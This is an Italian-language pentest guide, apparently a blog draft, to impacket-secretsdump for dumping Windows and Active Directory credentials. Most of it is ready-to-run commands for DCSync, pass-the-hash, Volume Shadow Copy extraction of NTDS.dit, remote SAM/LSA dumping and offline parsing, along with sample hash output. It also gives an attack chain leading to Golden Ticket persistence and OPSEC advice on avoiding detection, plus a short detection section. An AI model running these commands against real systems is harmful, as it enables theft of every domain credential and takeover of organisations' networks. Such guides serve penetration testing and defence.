---
title: 'impacket-secretsdump: Dump di Hash e Credenziali Windows'
slug: secretsdump
description: 'Guida a impacket-secretsdump: dump remoto e offline di hash NTLM, SAM, LSA secrets, chiavi Kerberos e NTDS.dit in Windows e Active Directory.'
image: /secretsdump-active-directory.webp
draft: true
date: 2026-07-15T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - Impacket
  - credential dumping
  - DCSync
  - NTDS.dit
  - NTLM
  - LSA secrets
---

# impacket-secretsdump: Guida al Dump di Credenziali Windows e Active Directory

`impacket-secretsdump` estrae credenziali da sistemi Windows — hash NTLM, chiavi Kerberos AES, LSA secrets, cached credentials, password history — senza eseguire alcun agente o binario sul target. Opera via SMB, WMI e il protocollo di replica AD (DRSUAPI) usando esclusivamente credenziali valide.

***

`secretsdump.py` (distribuito come `impacket-secretsdump` su Kali) è parte del framework [Impacket](https://hackita.it/articoli/impacket/). È lo strumento di credential dumping remoto più usato nei pentest Windows perché non richiede upload di tool sul target — tutto avviene via protocolli di rete standard, usando le credenziali dell'account compromesso.

> secretsdump usa tre meccanismi distinti — DCSync via DRSUAPI, Volume Shadow Copy, e lettura del registro remoto. La scelta del meccanismo dipende dal tipo di target (DC vs workstation) e dai privilegi disponibili.

***

## Cheat Sheet — Comandi Principali

| Obiettivo                      | Comando                                                                          |
| ------------------------------ | -------------------------------------------------------------------------------- |
| Dump dominio completo (DCSync) | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -just-dc`                    |
| Solo NTLM hash                 | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -just-dc-ntlm`               |
| Singolo utente                 | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -just-dc-user krbtgt`        |
| Con password history           | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -just-dc -history`           |
| SAM + LSA remoto               | `impacket-secretsdump corp.local/admin:Pass@<TARGET_IP>`                         |
| Pass-the-Hash                  | `impacket-secretsdump -hashes :NThash corp.local/admin@<DC_IP> -just-dc`         |
| Kerberos ticket                | `KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass corp.local/admin@DC01` |
| Offline NTDS.dit               | `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`                       |
| Offline SAM                    | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`          |
| VSS method                     | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -use-vss`                    |
| Save to file                   | `impacket-secretsdump corp.local/admin:Pass@<DC_IP> -just-dc -outputfile dump`   |

***

| Meccanismo             | Flag                       | Target                   | Richiede                               |
| ---------------------- | -------------------------- | ------------------------ | -------------------------------------- |
| **DRSUAPI (DCSync)**   | `-just-dc`                 | Solo DC                  | `Replicating Directory Changes All`    |
| **Volume Shadow Copy** | `-use-vss`                 | DC o server              | Admin locale + accesso ADMIN$          |
| **Registro remoto**    | (default)                  | Qualsiasi Windows        | Admin locale + Remote Registry service |
| **File offline**       | `-ntds/-sam/-system LOCAL` | Nessuno (parsing locale) | File già estratti                      |

***

## Autenticazione

```bash
# Password in chiaro
impacket-secretsdump corp.local/administrator:Password123!@<TARGET>

# Pass-the-Hash
impacket-secretsdump -hashes :NThash corp.local/administrator@<TARGET>

# Kerberos (con ticket in memoria)
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@DC01.corp.local

# Pass-the-Hash con LM hash esplicito (raro, LM quasi sempre disabilitato)
impacket-secretsdump -hashes LMhash:NThash corp.local/administrator@<TARGET>
```

***

## DCSync — Dump dell'Intero Dominio

Il metodo principale contro un Domain Controller. Non richiede accesso locale al DC — usa il protocollo di replica DRSUAPI via rete. Richiede i permessi `DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All`.

```bash
# Dump completo via DCSync (NTLM + AES keys + password history)
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc

# Solo hash NTLM — più veloce, output più pulito
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc-ntlm

# Utente specifico — meno rumore, ottimo per krbtgt o Administrator
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc-user administrator

# Include password history (tutte le versioni precedenti degli hash)
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc -history

# Salva output su file
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -just-dc -outputfile domain_hashes
# → genera domain_hashes.ntds e domain_hashes.ntds.kerberos

# Specifica DC per hostname invece di IP
impacket-secretsdump corp.local/administrator:Password123!@DC01.corp.local -just-dc -dc-ip <DC_IP>
```

Output DCSync:

```
corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561d2fcb18e26f2a5b4e69f7:::
corp.local\svc_mssql:1103:aad3b435b51404eeaad3b435b51404ee:e3d560571d57477ac4b23c380f5d185a:::
```

Formato: `username:RID:LMhash:NThash:::`

***

## VSS — Volume Shadow Copy

Alternativa a DCSync per ottenere NTDS.dit. Crea una shadow copy del disco, copia i file bloccati, li scarica e li analizza localmente. Più invasivo (esegue comandi sul DC) ma utile quando DRSUAPI è bloccato.

```bash
# Forza VSS invece di DRSUAPI
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -use-vss

# Specifica il metodo di esecuzione dei comandi sul DC (default: smbexec)
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -use-vss -exec-method wmiexec
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -use-vss -exec-method mmcexec

# VSS solo su DC (combina dump NTDS + SAM + LSA)
impacket-secretsdump corp.local/administrator:Password123!@<DC_IP> -use-vss -just-dc
```

***

## Registro Remoto — SAM, LSA, Cached Credentials

Su macchine non-DC (workstation, server), il metodo default legge SAM e SECURITY hive via registro remoto. Estrae hash locali, LSA secrets, DPAPI keys e credenziali cached (DCC2).

```bash
# Dump completo su workstation (SAM + LSA + cached creds)
impacket-secretsdump corp.local/administrator:Password123!@<WORKSTATION_IP>

# Solo SAM (hash account locali)
impacket-secretsdump corp.local/administrator:Password123!@<WORKSTATION_IP> -sam

# Solo LSA secrets (service account password, autologon, ecc.)
impacket-secretsdump corp.local/administrator:Password123!@<WORKSTATION_IP> -security
```

Output su workstation:

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC — hash del computer account
[*] DPAPI_SYSTEM — chiavi DPAPI di sistema
[*] DefaultPassword — password autologon se configurata
[*] Dumping cached domain logon information (domain/username:hash)
CORP/john.doe:$DCC2$10240#john.doe#...
```

***

## Parsing Offline — File Già Estratti

Quando hai già i file (NTDS.dit, SAM, SYSTEM, SECURITY) estratti da un'altra tecnica (VSS manuale, Volume Shadow Copy, backup):

```bash
# Parsing NTDS.dit offline (il metodo più comune)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Include password history
impacket-secretsdump -ntds ntds.dit -system SYSTEM -history LOCAL

# Parsing SAM + SECURITY offline (hash locali + LSA secrets)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Solo SAM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Per estrarre i file su Windows prima di portarli offline:

```powershell
# Estrai hive di registro (richiede SYSTEM privileges)
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SECURITY C:\temp\SECURITY

# NTDS.dit via Volume Shadow Copy (su DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

***

## Alternativa: NetExec

[NetExec](https://hackita.it/articoli/netexec/) offre un'interfaccia più semplice per il DCSync con lo stesso risultato:

```bash
# DCSync con password
nxc smb <DC_IP> -u administrator -p Password123! --ntds

# DCSync con Pass-the-Hash
nxc smb <DC_IP> -u administrator -H :NThash --ntds

# Solo utente specifico
nxc smb <DC_IP> -u administrator -p Password123! --ntds --users krbtgt
```

***

## Scenario Reale: Da Utente AD a Dump Completo del Dominio

Hai compromesso un account con diritti DCSync (identificato via [BloodHound](https://hackita.it/articoli/bloodhound/)):

```bash
# 1. Dump selettivo — prima krbtgt e administrator per il massimo impatto
impacket-secretsdump corp.local/svc_backup:Password123!@DC01.corp.local \
  -just-dc-user krbtgt -outputfile krbtgt

impacket-secretsdump corp.local/svc_backup:Password123!@DC01.corp.local \
  -just-dc-user administrator -outputfile admin

# 2. Dump completo del dominio in background
impacket-secretsdump corp.local/svc_backup:Password123!@DC01.corp.local \
  -just-dc -outputfile full_domain_dump

# 3. Con l'hash di krbtgt → Golden Ticket per persistenza
# Con l'hash di Administrator → PTH su tutto il dominio
```

***

## Filtrare l'Output

L'output di un dump completo può contenere migliaia di righe. Comandi utili per filtrare:

```bash
# Estrai solo gli NT hash (quarta colonna) per hashcat
cat domain_hashes.ntds | cut -d: -f4 > nt_hashes.txt

# Trova account abilitati (Enabled=True nell'output)
grep "Enabled=True" domain_hashes.ntds | cut -d: -f1,4

# Filtra account specifici
grep "administrator\|krbtgt\|svc_" domain_hashes.ntds

# Conta gli hash unici (per statistiche)
cat domain_hashes.ntds | cut -d: -f4 | sort -u | wc -l
```

***

## OPSEC

* DCSync via DRSUAPI genera **Event ID 4662** sul DC — accesso all'oggetto dominio con diritti di replica. È rilevabile se l'auditing è attivo
* Il metodo VSS esegue comandi sul DC (vssadmin) — più rumoroso di DRSUAPI, genera più eventi
* Il metodo registro remoto su workstation avvia il servizio `RemoteRegistry` se non è già attivo — un servizio che si avvia improvvisamente è un segnale
* Usa `-just-dc-user` per dumpare solo gli account necessari invece di tutto il dominio — meno rumore, meno dati trasmessi sulla rete
* Salva sempre l'output su file con `-outputfile` — permette analisi offline senza rieseguire il dump

***

## Detection

**🔴 HIGH:**

* **Event ID 4662** — accesso all'oggetto dominio con diritti `DS-Replication-Get-Changes-All` da un account non DC
* **Event ID 4688** — esecuzione di `vssadmin create shadow` sul DC (metodo VSS)
* Connessioni RPC verso la porta 135 + porte dinamiche del DC da host non-DC

**🟡 MEDIUM:**

* Avvio del servizio `RemoteRegistry` su workstation che normalmente non lo usano
* Accesso ai percorsi `ADMIN$` + `C$` seguito immediatamente da creazione file in `Windows\Temp`

***

## FAQ

**Qual è la differenza tra `-just-dc` e senza flag su un DC?**
Senza flag su un DC, secretsdump tenta prima il registro remoto (SAM + LSA) e poi prova NTDS via VSS. `-just-dc` usa esclusivamente DRSUAPI (DCSync) — più silenzioso e affidabile su DC.

**DCSync funziona anche con hash NTLM invece della password?**
Sì: `impacket-secretsdump -hashes :NThash corp.local/user@<DC_IP> -just-dc`

**Perché l'LM hash è sempre `aad3b435b51404eeaad3b435b51404ee`?**
È il valore LM hash di una stringa vuota — indica che LM hash è disabilitato (default da Windows Vista). Solo l'NT hash è rilevante per Pass-the-Hash.

***

## Conclusione

impacket-secretsdump è lo strumento più diretto per estrarre credenziali in un pentest AD: nessun agente, nessun binario sul target, nessun AV da bypassare — solo protocolli Windows autenticati. Con DCSync, basta un account con diritti di replica per ottenere tutti gli hash del dominio in pochi secondi.

La difesa efficace richiede monitoring degli Event ID 4662 e 4688, e una revisione dei permessi di replica — verificando con [BloodHound](https://hackita.it/articoli/bloodhound/) quali account non-DC hanno `DS-Replication-Get-Changes-All`.

***

**Risorse:**

* [Impacket GitHub](https://github.com/fortra/impacket)
* [HackTricks – secretsdump](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html)
